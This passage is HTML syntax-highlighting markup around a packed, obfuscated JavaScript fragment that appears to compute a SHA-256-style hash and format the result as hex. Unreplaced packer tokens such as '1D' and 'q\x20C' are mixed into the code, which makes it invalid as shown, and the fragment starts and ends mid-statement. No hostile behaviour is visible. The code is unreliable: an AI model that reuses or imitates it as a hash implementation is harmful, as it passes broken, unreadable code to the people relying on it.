class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span 